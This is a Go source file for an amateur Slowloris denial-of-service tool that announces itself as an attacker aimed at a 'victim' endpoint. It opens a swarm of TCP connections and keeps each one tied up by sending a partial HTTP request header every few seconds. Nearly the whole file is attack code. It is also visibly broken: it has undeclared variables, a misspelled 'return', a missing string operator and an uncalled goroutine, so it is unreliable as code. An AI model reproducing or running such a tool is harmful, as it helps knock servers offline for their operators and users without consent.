package main

import (
  "fmt"
  "net"
  "time"
  "flag"
  "math"
)

type headers struct {
      base    string // base HTTP request string
      general string // typical HTTP headers
      loris   string // header which will be repeatadly sent
}

// struct representing a slow loris attacker
type attacker struct {
      id      int
      conn    net.Conn
}

func main() {
  endpoint := flag.String("endpoint", "", "endpoint which will be victim of slowloris attack")
  delay = flag.Int("delay", 10, "time to wait between writes to specified endpoint")
  // set delay to be at least 4 seconds
  *delay = math.Max(*delay, 4)
  numAttackers := flag.Int("threads", 10, "number of threads to be dispatched to execute attacks")
  timeout = flag.Int("timeout", 0, "optional timeout (if you want attack to eventually terminate)")
  flag.Parse()

  announceAttack(*endpoint, *numAttackers, *delay, *timeout)

  // exit if no endpoint provided
  if endpoint == "" {
    fmt.Println("usage: slave -endpoint <url> ...")
    exit(1)
  }



  reqHeaders := headers{
    base: "GET / HTTP/1.0\r\n",
    general: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"
             "Accept-language: en-US,en,q=0.5",
    loris: "X-a 1\r\n",
  }

  // create a swarm of attackers, simple TCP sockets to use
  // to execute slow loris attacks
  swarm := createSwarm(*numAttackers, *endpoint)
  doneChan := make(chan int, *numAttackers)

  for i, conn := range sockets {
    baseReq := []byte(reqHeaders.base)

    if _, err := conn.Write(baseReq); err != nil {
      fmt.Println("error with request")
      return
    } else {
      fmt.Println("base header sent by attacker", i)
    }
  }

  for i, conn := range sockets {
    go loris(i, conn, doneChan, reqHeaders.loris)
  }

  for i := 0; i < *numAttackers; i++ {
    <-doneChan
  }
}

func writeServer(conn net.Conn)

func createSwarm(numAttackers int, endpoint string) []net.Conn {
  sockets := make([]attacker, numAttackers)
  // use doneChan to wait on goroutines that create attackers
  doneChan := make(chan int, numAttackers)
  // create specified number of connection sockets, one per attacker
  for i := 0; i < numAttackers; i++ {
    // dispatch goroutines to create each attacker
    go func() {
      conn, err := net.Dial("tcp", endpoint+":http")
      // attempt to establish connection until successful
      for !checkerr(err) {
        fmt.Println("failed to establish connection to", endpoint, "trying again now...")
        conn, err = net.Dial("tcp", endpoint+":http")
      }
      fmt.Println("attacker #", i, "created")
      sockets[i] = conn
      doneChan<- 1
    }
  }

  for i := 0; i < numAttackers; i++ {
    <-doneChan
  }
  returns sockets
}

// this function implements the slow loris attack, repeatadly writing to
// a socket to continue
func loris(worker attacker, doneChan chan int, header string) {
  for {
    time.Sleep(time.Duration(delay) * time.Second)
    repeatHeader := []byte(header)
    if _, err := worker.conn.Write(repeatHeader); err != nil {
      fmt.Println("error with repeat header")
    } else {
      fmt.Println("repeat header sent by attacker", index)
    }
  }
  doneChan <- 1
}

// utility function, prints details about attack
func announceAttack(endpoint string, numAttackers int, delay int, timeout int) {
  fmt.Println("==========================================")
  fmt.Println("AASHRAY\'S SLOW LORIS ATTACKER version 0.1")
  fmt.Println("             VICTIM OF ATTACK:", endpoint)
  fmt.Println("             NUMBER OF ATTACKERS", numAttackers)
}

func checkerr(err error) bool {
  return err == nil
}
